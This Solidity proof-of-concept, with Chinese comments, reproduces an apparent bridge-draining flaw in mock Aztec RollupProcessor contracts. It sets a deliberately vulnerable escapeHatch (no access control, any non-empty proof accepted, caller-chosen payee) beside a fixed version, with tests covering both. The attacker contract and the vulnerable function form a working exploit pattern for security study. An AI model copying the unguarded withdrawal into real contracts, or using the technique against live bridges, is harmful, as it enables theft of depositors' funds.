// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

// =============================================================================
// PoC: Aztec 已废弃 RollupProcessor 桥 — escapeHatch 缺访问控制 + 证明不绑定资金归属
//
// 根因(见报告 Aztec-RollupProcessor-2.16M.md §2):
//   ① escapeHatch 紧急取款函数缺乏访问控制(无 onlyOwner / 无 provider / 无签名校验);
//   ② 证明系统未把"资金应归属谁"绑定到证明上 —— outputOwner(收款人)与 amount
//      可由提交者在证明输入里任意指定;
//   ③ 验证器对退化输入(rollupSize=0)放行,只要"证明非空"即视为合法逃生交易;
//   ④ L1 放款前无独立的资金归属二次校验 —— 证明一过即按 to/amount 放钱。
//
//   结果:任意外部地址凭一份自填(伪造、不绑定真实存款)的证明即可单笔抽空桥内资产。
//
// 本 PoC 用最小可运行模型忠实复现该因果链,不 import forge-std。
// =============================================================================

// 最小 ERC20(用于复现桥内同时持有 ETH + 代币储备,如真实事件中的 DAI / renBTC)
contract MockToken {
    string public name = "MockDAI";
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// -----------------------------------------------------------------------------
// 脆弱版 Processor(忠实复现根因)
//
// escapeHatch(bytes proof, address to, uint256 amount):
//   - 不校验 msg.sender 权限(任何人可调);
//   - "验证"仅检查 proof 非空(模拟 TurboVerifier 对 rollupSize=0 退化证明放行,
//     且证明内容/归属可自填);
//   - proof 与资金归属(to / amount)之间没有任何绑定校验;
//   - 校验通过后,直接按调用者给定的 to / amount 放款。
// -----------------------------------------------------------------------------
contract VulnerableRollupProcessor {
    MockToken public token;

    constructor(MockToken _token) {
        token = _token;
    }

    receive() external payable {}

    // 模拟"验证器" —— 真实事件中 rollupSize=0 的逃生证明被无条件接受,
    // 这里以"证明非空即通过"还原其"只看形式、不绑定归属"的本质。
    function _verifyProof(bytes calldata proof) internal pure returns (bool) {
        return proof.length > 0; // 唯一"门槛":证明非空 —— 内容/归属完全自填
    }

    // 紧急取款:缺访问控制 + 证明不绑定资金归属
    function escapeHatch(bytes calldata proof, address to, uint256 amount) external {
        // (1) 无访问控制:没有 onlyOwner / provider / 签名校验
        // (2) 仅"验证"证明非空,且 to/amount 与 proof 无任何绑定
        require(_verifyProof(proof), "invalid proof");

        // (3) 证明一过即放款:ETH + 代币按调用者自填的 to/amount 直接转出
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok, ) = to.call{value: ethBal}("");
            require(ok, "eth transfer failed");
        }
        uint256 tokenBal = token.balanceOf(address(this));
        if (tokenBal > 0) {
            token.transfer(to, tokenBal);
        }
        // amount 仅作"证明里声明的金额"占位,合约甚至不校验它与实际余额一致 —— 凸显无绑定
        amount;
    }
}

// -----------------------------------------------------------------------------
// 修复版 Processor(对照)
//
// 两道独立防线,任一即可挡住攻击:
//   A. 访问控制:escapeHatch 仅 owner / 注册的 rollup provider 可调;
//   B. 证明—归属绑定:出金对象 to 必须等于该证明真实绑定的存款人(depositOwner),
//      且金额不得超过其真实存款 —— outputOwner 不能由提交者任意指定。
// -----------------------------------------------------------------------------
contract FixedRollupProcessor {
    MockToken public token;
    address public owner;

    // 证明 hash => 真实存款归属与额度(由真实存款流程登记,提交者无法篡改)
    struct Claim {
        address depositOwner; // 资金真正归属谁
        uint256 amount;       // 其真实可取额度
        bool used;
    }
    mapping(bytes32 => Claim) public claims;

    constructor(MockToken _token) {
        token = _token;
        owner = msg.sender;
    }

    receive() external payable {}

    // 真实存款时由系统登记归属(模拟"证明绑定真实资金归属")
    function registerClaim(bytes32 proofHash, address depositOwner, uint256 amount) external {
        require(msg.sender == owner, "only owner registers");
        claims[proofHash] = Claim(depositOwner, amount, false);
    }

    function escapeHatch(bytes calldata proof, address to, uint256 amount) external {
        // 防线 A:访问控制 —— 非 owner 直接 revert
        require(msg.sender == owner, "FIXED: only owner");

        // 防线 B:证明必须绑定真实归属,且收款人=真实存款人、额度不超真实存款
        bytes32 proofHash = keccak256(proof);
        Claim storage c = claims[proofHash];
        require(c.depositOwner != address(0), "FIXED: proof not bound to any deposit");
        require(!c.used, "FIXED: claim already used");
        require(to == c.depositOwner, "FIXED: to must equal real deposit owner");
        require(amount <= c.amount, "FIXED: amount exceeds real deposit");
        c.used = true;

        (bool ok, ) = to.call{value: amount}("");
        require(ok, "eth transfer failed");
    }
}

// -----------------------------------------------------------------------------
// 测试(不依赖 forge-std)
// -----------------------------------------------------------------------------
contract AztecPoC {
    uint256 constant ETH_RESERVE = 1158 ether;     // ~事件规模:1,158 ETH
    uint256 constant TOKEN_RESERVE = 150_000 ether; // ~150,000 DAI

    receive() external payable {}

    // ① + ② 脆弱版:attacker 用任意/伪造 proof 调用 escapeHatch,把储备提到自己地址,断言被抽空。
    function testExploitDrainsVulnerableProcessor() external {
        MockToken token = new MockToken();
        VulnerableRollupProcessor processor = new VulnerableRollupProcessor(token);

        // 桥内注入 ETH + 代币储备
        (bool funded, ) = address(processor).call{value: ETH_RESERVE}("");
        require(funded, "fund failed");
        token.mint(address(processor), TOKEN_RESERVE);

        require(address(processor).balance == ETH_RESERVE, "setup: eth reserve");
        require(token.balanceOf(address(processor)) == TOKEN_RESERVE, "setup: token reserve");

        // attacker:一份与任何真实存款都不绑定的伪造证明,outputOwner 自填为自己
        Attacker attacker = new Attacker(processor);
        bytes memory forgedProof = hex"deadbeef"; // 任意非空证明,内容自定义、不绑定归属

        uint256 attackerEthBefore = address(attacker).balance;

        // 任意地址(此处 attacker 合约)即可调用 —— 无访问控制
        attacker.exploit(forgedProof, ETH_RESERVE);

        // 断言:桥被抽空,资金落入 attacker
        require(address(processor).balance == 0, "FAIL: processor ETH not drained");
        require(token.balanceOf(address(processor)) == 0, "FAIL: processor token not drained");
        require(
            address(attacker).balance == attackerEthBefore + ETH_RESERVE,
            "FAIL: attacker did not receive ETH"
        );
        require(token.balanceOf(address(attacker)) == TOKEN_RESERVE, "FAIL: attacker did not receive token");
    }

    // ③ 对照 — 修复版:同样的伪造 proof + 非 owner 调用 => revert(被访问控制挡下)。
    function testFixedRejectsUnauthorizedCaller() external {
        MockToken token = new MockToken();
        FixedRollupProcessor processor = new FixedRollupProcessor(token);
        (bool funded, ) = address(processor).call{value: ETH_RESERVE}("");
        require(funded, "fund failed");

        Attacker2 attacker = new Attacker2(processor);
        bytes memory forgedProof = hex"deadbeef";

        // attacker 调用应 revert(防线 A:onlyOwner)
        (bool ok, ) = address(attacker).call(
            abi.encodeWithSignature("exploitFixed(bytes,uint256)", forgedProof, ETH_RESERVE)
        );
        require(!ok, "FAIL: fixed processor should revert on unauthorized caller");

        // 资金原封未动
        require(address(processor).balance == ETH_RESERVE, "FAIL: fixed funds moved");
    }

    // ③ 对照 — 修复版第二道防线:即便是 owner,用一份未绑定真实存款归属的证明也无法放款。
    function testFixedRejectsUnboundProof() external {
        MockToken token = new MockToken();
        // 本测试合约作为 owner 部署
        FixedRollupProcessor processor = new FixedRollupProcessor(token);
        (bool funded, ) = address(processor).call{value: ETH_RESERVE}("");
        require(funded, "fund failed");

        bytes memory unboundProof = hex"deadbeef"; // 从未通过 registerClaim 绑定任何存款

        // owner(本合约)亲自调用,但证明未绑定归属 => revert(防线 B)
        (bool ok, ) = address(processor).call(
            abi.encodeWithSignature(
                "escapeHatch(bytes,address,uint256)",
                unboundProof,
                address(this),
                ETH_RESERVE
            )
        );
        require(!ok, "FAIL: fixed processor should revert on unbound proof");
        require(address(processor).balance == ETH_RESERVE, "FAIL: fixed funds moved");
    }

    // ③ 对照 — 修复版正常路径:绑定到真实存款人的证明,owner 按真实归属放款成功(且不能改收款人)。
    function testFixedAllowsLegitimateBoundClaim() external {
        MockToken token = new MockToken();
        FixedRollupProcessor processor = new FixedRollupProcessor(token);
        (bool funded, ) = address(processor).call{value: 1 ether}("");
        require(funded, "fund failed");

        address realDepositor = address(0xBEEF);
        bytes memory proof = hex"c0ffee";
        bytes32 proofHash = keccak256(proof);

        // 真实存款流程登记归属(owner 操作)
        processor.registerClaim(proofHash, realDepositor, 1 ether);

        // owner 用绑定证明放款给真实存款人 —— 成功
        uint256 before = realDepositor.balance;
        processor.escapeHatch(proof, realDepositor, 1 ether);
        require(realDepositor.balance == before + 1 ether, "FAIL: legit claim did not pay depositor");

        // 关键:owner 也不能把同一份证明的钱改发给别人(归属绑定) —— 这里证明已 used
        (bool ok, ) = address(processor).call(
            abi.encodeWithSignature(
                "escapeHatch(bytes,address,uint256)",
                proof,
                address(this),
                1 ether
            )
        );
        require(!ok, "FAIL: reusing/redirecting bound claim should revert");
    }
}

contract Attacker {
    VulnerableRollupProcessor public processor;

    constructor(VulnerableRollupProcessor _p) {
        processor = _p;
    }

    receive() external payable {}

    function exploit(bytes calldata proof, uint256 amount) external {
        // 收款人 to = 自己 —— 证明不绑定归属,outputOwner 任意指定
        processor.escapeHatch(proof, address(this), amount);
    }
}

contract Attacker2 {
    FixedRollupProcessor public processor;

    constructor(FixedRollupProcessor _p) {
        processor = _p;
    }

    receive() external payable {}

    function exploitFixed(bytes calldata proof, uint256 amount) external {
        processor.escapeHatch(proof, address(this), amount);
    }
}
